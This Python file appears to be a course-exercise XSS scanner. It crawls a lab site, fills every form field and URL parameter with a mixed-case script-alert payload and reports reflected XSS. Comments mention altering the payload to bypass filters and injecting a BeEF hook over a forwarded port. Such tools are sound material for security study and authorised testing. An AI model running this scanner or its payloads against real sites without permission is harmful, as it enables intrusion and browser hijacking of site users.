#!python

import requests, re
from urllib.parse import urljoin
from bs4 import BeautifulSoup

#I can inject Beef !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#you'll have to enable portforwarding for port 3000 (BeEF's port) or set your Kali machine as a DMZ host,

class Scanner:
    def __init__(self, url, ignore_links):
        self.session = requests.Session()
        # self.bun = self.session.get(url)
        # self.cookie = self.session.cookies['csrftoken']
        # self.autho = dict(username="dom", password="123", csrfmiddlewaretoken=self.cookie, next="/")
        self.target_url = url
        self.target_links = []
        self.links_to_ignore = ignore_links

    def extract_links_from(self, url):
        response = self.session.get(url) #For websites with login. To stay logged i
        html = response.content.decode("utf8")
        return re.findall('(?:href=")(.*?)"', html)  # non-greedy (.*?)

    def crawl(self, url = None):
        if url == None:
            url = self.target_url
        links = self.extract_links_from(url)
        for link in links:
            link = urljoin(url, link)  # fix relative links. Automatically keep the good ones.
            # for links like: http://10.0.2.8/mutillidae/prod/#tab1 | http://10.0.2.8/mutillidae/prod/#tab2
            if "#" in link:
                link = link.split("#")[0]  # store only first part
            # Keep only the url for this sites + uniques
            if self.target_url in link and link not in self.target_links and link not in self.links_to_ignore:
                self.target_links.append(link)  # At this moment we know this link is unique
                print(link)
                self.crawl(link)  # CALL HIMSELF

    def extract_forms(self, url):
        response = self.session.get(url)
        # Extract all forms
        parsed_html = BeautifulSoup(response.content, features="html.parser")
        return parsed_html.findAll("form")
    def submit_forms(self, form, value, url):
        action = form.get("action")
        post_url = urljoin(url, action)  # Buildin from relative url to full url
        method = form.get("method")
        input_list = form.findAll("input")
        post_data = {}
        for input in input_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = value
            post_data[input_name] = input_value
        if method == "post":
            return self.session.post(post_url, data=post_data)

        return self.session.get(post_url, params=post_data)

    def run_scanner(self):
        for link in self.target_links:
            forms = self.extract_forms(link)
            for form in forms:
                print("[+] Testing form in: " + link)
                is_vul_to_xss = self.test_xss_in_form(form, link)            #ADD METHOD FOR VULNERABILITY IN A FORM
                if is_vul_to_xss:
                    print("\n\n[*****]XSS DISCOVERED in form: " + link + "\n\n")

            #Testing parameters
            if "=" in link:
                print("[+] Testing link in: " + link)
                is_vul_to_xss = self.test_xss_in_link(link) #ADD METHOD FOR VULNERABILITY IN A LINK
                if is_vul_to_xss:
                    if is_vul_to_xss:
                        print("\n\n[*****]XSS DISCOVERED in link: " + link + "\n\n")

    def test_xss_in_link(self, url):
        xss_test_script = "<sCript>alert('xss')</scriPt>"  # modify the code to bypass filters
        url = url.replace("=", "="+xss_test_script)
        response = self.session.get(url)
        return xss_test_script in response.content.decode("utf8")

    def test_xss_in_form(self, form, url):
        xss_test_script = "<sCript>alert('xss')</scriPt>" #modify the code to bypass filters
        response = self.submit_forms(form, xss_test_script, url)
        return xss_test_script in response.content.decode("utf8")
